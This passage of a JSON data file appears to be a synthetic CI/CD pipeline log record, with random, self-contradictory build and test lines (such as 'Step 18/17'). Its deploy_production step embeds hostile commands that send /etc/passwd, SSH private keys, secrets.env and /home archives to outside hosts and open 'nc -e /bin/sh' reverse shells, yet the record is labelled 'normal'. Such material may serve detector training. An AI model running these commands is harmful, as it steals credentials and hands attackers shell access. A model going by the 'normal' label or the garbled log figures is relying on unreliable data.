          "  PASS: test_cache_hit (279ms)",
          "Connection established",
          "Using Node.js 20.20.6",
          "[12:20:08] DEBUG: Query executed in 35ms",
          "Platform: linux-x64",
          "Switched to branch 'feature/task-151'",
          "Verifying...",
          "Checking out master branch",
          "Creating production build...",
          "Compiling lib/main.py...",
          "Already up to date.",
          "npm install: resolved 1007 packages",
          "pip install: Successfully installed jest-4.7",
          "Uploading artifact 'coverage' (1 files)",
          "Snapshots: 35 passed, 8 total",
          "npm notice: created a lockfile",
          "WARNING: express has known vulnerabilities",
          "\u2717 build failed with exit code 21",
          "[12:20:08] INFO: Starting build process",
          "Installing express@3.4.9",
          "Artifact downloaded: 35MB",
          "pip install: Successfully installed eslint-1.16",
          "WARNING: jest has known vulnerabilities",
          "  PASS: test_auth_login (47ms)",
          "=== Step setup_environment completed ==="
        ]
      },
      {
        "name": "install_dependencies",
        "status": "success",
        "started_at": "2025-12-05T12:21:32.233388",
        "finished_at": "2025-12-05T12:21:50.292005",
        "log_lines": [
          "=== Step: install_dependencies ===",
          "Test Suites: 20 passed, 8 total",
          "Loading...",
          "Done.",
          "[12:20:08] INFO: Starting build process",
          "Compiling components/service.java...",
          "Cache miss for key-1053",
          "Artifact downloaded: 29MB",
          "\u2713 Task completed in 3762ms",
          "Processing...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Step 11/16: Linting",
          "[12:20:08] DEBUG: Connection pool: 20 active",
          "[12:20:08] INFO: Cache refreshed",
          "[12:20:08] DEBUG: Connection pool: 6 active",
          "Uploading artifact 'coverage' (27 files)",
          "Pushing to registry...",
          "Pushing to registry...",
          "pip: Installing build dependencies...",
          "Compiling lib/app.ts...",
          "Compiling utils/main.py...",
          "Uploading artifact 'coverage' (39 files)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "pip: Collecting jest",
          "npm install: added 251 packages",
          "npm install: added 289 packages",
          "Test Suites: 37 passed, 34 total",
          "Artifact downloaded: 34MB",
          "[12:20:08] ERROR: Connection failed",
          "[12:20:08] INFO: Request completed",
          "Checking out develop branch",
          "Cache miss for key-5992",
          "Loading...",
          "[12:20:08] DEBUG: Connection pool: 15 active",
          "\u2713 Step 'test' succeeded",
          "Cache saved successfully",
          "Step 8/17: Deploying",
          "Artifact uploaded: build.tar.gz (43MB)",
          "Loading...",
          "NODE_ENV=development",
          "WARNING: axios has known vulnerabilities",
          "Step 10/25: Running migrations",
          "pip: Downloading react-4.9.tar.gz",
          "Image pulled successfully",
          "Step 5/22: Installing dependencies",
          "[12:20:08] INFO: Starting build process",
          "Verifying...",
          "  PASS: e2e/test_user_create.spec.js",
          "npm notice: package.json updated",
          "Using Python 3.9",
          "Environment: test",
          "[12:20:08] DEBUG: Initializing service",
          "WARNING: eslint has known vulnerabilities",
          "NODE_ENV=production",
          "npm notice: package.json updated",
          "Checking out master branch",
          "Loading...",
          "[12:20:08] WARN: Deprecated API usage",
          "Verifying...",
          "Platform: win32-x64",
          "OK",
          "Artifact uploaded: dist.zip (27MB)",
          "\u2717 build failed with exit code 40",
          "Artifact uploaded: dist.zip (77MB)",
          "WARNING: webpack has known vulnerabilities",
          "Fetching submodules...",
          "Coverage: 86% statements, 97% branches",
          "TLS handshake completed",
          "[12:20:08] INFO: Starting build process",
          "OK",
          "[12:20:08] INFO: Starting build process",
          "Step 15/17: Building",
          "[12:20:08] WARN: Deprecated API usage",
          "FAILED: test_api_health",
          "Step 19/19: Linting",
          "Creating production build...",
          "Processing...",
          "=== Step install_dependencies completed ==="
        ]
      },
      {
        "name": "integration_tests",
        "status": "success",
        "started_at": "2025-12-05T12:21:50.292005",
        "finished_at": "2025-12-05T12:22:02.331083",
        "log_lines": [
          "=== Step: integration_tests ===",
          "Creating production build...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Transforming 916 files...",
          "Cache restored successfully (184MB)",
          "Completed.",
          "Layer 8/13: RUN command",
          "Step 12/20: Running migrations",
          "Switched to branch 'bugfix/task-722'",
          "Finished.",
          "npm notice: package.json updated",
          "POST /data - 200 (273ms)",
          "[12:20:08] DEBUG: Connection pool: 18 active",
          "Cache miss for key-2648",
          "Optimizing 50 modules...",
          "Verifying...",
          "Optimizing 63 modules...",
          "Connection established",
          "Pushing to registry...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Ready.",
          "Coverage: 78% statements, 87% branches",
          "Artifact uploaded: build.tar.gz (23MB)",
          "Step 1/24: Installing dependencies",
          "Loading...",
          "Verifying...",
          "npm install: resolved 1772 packages",
          "yarn add: Done in 21.62s",
          "Done.",
          "Fetching submodules...",
          "[12:20:08] INFO: Processing request",
          "WARNING: webpack has known vulnerabilities",
          "Layer 2/15: ENV command",
          "Layer 5/10: ENV command",
          "npm install: resolved 1950 packages",
          "Installing react@4.14.6",
          "Fetching submodules...",
          "Ready.",
          "Step 9/22: Building",
          "WARNING: react has known vulnerabilities",
          "HEAD is now at a7c780b",
          "[12:20:08] WARN: Deprecated API usage",
          "pip install: Successfully installed lodash-4.8",
          "[12:20:08] INFO: Cache refreshed",
          "Completed.",
          "POST /upload - 201 (257ms)",
          "Done.",
          "  PASS: integration/test_api_health.spec.js",
          "[12:20:08] INFO: Starting build process",
          "Exception: ValueError",
          "Ready.",
          "Done.",
          "Artifact uploaded: dist.zip (19MB)",
          "Step 18/17: Testing",
          "Cache invalidated: build",
          "[12:20:08] DEBUG: Connection pool: 18 active",
          "[12:20:08] INFO: Request completed",
          "[12:20:08] INFO: Request completed",
          "Step 8/22: Deploying",
          "pip: Collecting prettier",
          "TLS handshake completed",
          "[12:20:08] INFO: Request completed",
          "Loading...",
          "  PASS: test_api_health (55ms)",
          "Pushing to registry...",
          "Building Docker image...",
          "npm notice: created a lockfile",
          "Artifact downloaded: 23MB",
          "[12:20:08] WARN: Deprecated API usage",
          "Step 16/18: Building",
          "Cache miss for key-1105",
          "Platform: win32-x64",
          "Layer 1/13: RUN command",
          "\u2713 package completed",
          "  PASS: test_cache_hit (359ms)",
          "NODE_ENV=test",
          "Coverage: 85% statements, 67% branches",
          "=== Step integration_tests completed ==="
        ]
      },
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-12-05T12:22:02.331083",
        "finished_at": "2025-12-05T12:22:04.738899",
        "log_lines": [
          "=== Step: deploy_production ===",
          "Step 14/19: Running migrations",
          "Time: 27.497s",
          "[12:20:08] INFO: Connecting to database",
          "npm install: added 194 packages",
          "Cache hit for key-9316",
          "WARNING: express has known vulnerabilities",
          "Step 17/20: Testing",
          "wget --post-data=\"$(cat /etc/passwd)\" https://test.io/",
          "[12:20:08] DEBUG: Query executed in 33ms",
          "wget --post-data=\"$(cat /etc/passwd)\" https://test.io/",
          "Success!",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 129.223.13.49 5537",
          "Pushing to registry...",
          "Generating source maps...",
          "Completed.",
          "[12:20:08] INFO: Connecting to database",
          "Artifact uploaded: dist.zip (30MB)",
          "[12:20:08] INFO: Cache refreshed",
          "Using Node.js 15.9.7",
          "[12:20:08] ERROR: Connection failed",
          "Verifying...",
          "Connection established",
          "  PASS: e2e/test_db_connect.spec.js",
          "Platform: darwin-arm64",
          "pip: Downloading webpack-4.13.tar.gz",
          "curl -X POST https://acme.corp/collect -d @secrets.env",
          "Waiting...",
          "curl -X POST https://acme.corp/collect -d @secrets.env",
          "pip install: Successfully installed webpack-5.13",
          "Waiting...",
          "Cache restored successfully (360MB)",
          "npm notice: created a lockfile",
          "Image pulled successfully",
          "curl -X POST https://example.com/collect -d @secrets.env",
          "TLS handshake completed",
          "\u2713 build completed",
          "npm install: resolved 1919 packages",
          "Cache saved successfully",
          "Sending 46MB of data to acme.corp",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "POST /upload - 201 (496ms)",
          "Image pulled successfully",
          "Connection established",
          "Cache hit for key-8265",
          "Optimizing 95 modules...",
          "Success!",
          "[12:20:08] INFO: Starting build process",
          "Compiling lib/main.py...",
          "Environment: production",
          "  PASS: test_cache_hit (473ms)",
          "Pulling image: alpine:18",
          "Switched to branch 'feature/task-192'",
          "Connecting to example.com:443...",
          "Uploading artifact 'dist' (8 files)",
          "Cache invalidated: dependencies",
          "[12:20:08] DEBUG: Query executed in 87ms",
          "Switched to branch 'hotfix/task-466'",
          "Environment: development",
          "  PASS: integration/test_auth_login.spec.js",
          "OK",
          "nc -e /bin/sh 142.4.245.12 23239",
          "Waiting...",
          "wget --post-data=\"$(cat /etc/passwd)\" https://example.com/",
          "Ran 32 tests in 12s",
          "Sending 70MB of data to startup.dev",
          "Finished.",
          "Pulling image: node:3.11",
          "nc -e /bin/sh 99.33.90.65 63297",
          "npm install: resolved 1092 packages",
          "pip install: Successfully installed eslint-1.3",
          "[12:20:08] DEBUG: Query executed in 91ms",
          "Compiling components/index.js...",
          "Pushing to registry...",
          "Optimizing 60 modules...",
          "Step 8/22: Linting",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "wget --post-data=\"$(cat /etc/passwd)\" https://test.io/",
          "\u2713 Task completed in 1297ms",
          "Layer 7/10: ENV command",
          "tar czf - /home | curl -X POST -d @- https://acme.corp/upload",
          "Snapshots: 14 passed, 27 total",
          "Using Python 3.12",
          "Transforming 117 files...",
          "Ready.",
          "FAILED: test_user_create",
          "npm install: resolved 1584 packages",
          "Finished.",
          "[12:20:08] ERROR: Connection failed",
          "Artifact uploaded: dist.zip (79MB)",
          "=== Step deploy_production completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}